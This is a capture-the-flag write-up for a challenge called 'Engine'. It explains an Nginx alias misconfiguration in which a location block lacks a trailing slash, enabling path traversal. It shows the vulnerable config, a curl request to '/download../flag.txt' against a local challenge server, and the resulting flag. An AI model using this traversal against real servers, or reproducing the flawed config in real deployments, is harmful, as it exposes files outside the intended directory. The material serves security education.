# Engine

Alright, I think I fixed all of the bugs in the website. It's time to put this site into production, and I've decided to test with an Nginx reverse proxy. Hopefully it works as intended.

Author: Bode

## Solution

I googled "nginx misconfiguration reverse proxy" and clicked the first result: https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/. Under "Off-By-Slash", we see our provided config file has the same flaw:
```nginx
location /download {
    alias  /tmp/uploads/;
}
```
Since there is no trailing slash after `/download`, we can request `/download../flag.txt`; this will be normalized into `/tmp/uploads/../flag.txt`, which is just `/tmp/flag.txt`.

```
> curl http://localhost:8000/download../flag.txt
gigem{n0t_my_pr0bl3m}
```

flag:
`gigem{n0t_my_pr0bl3m}`
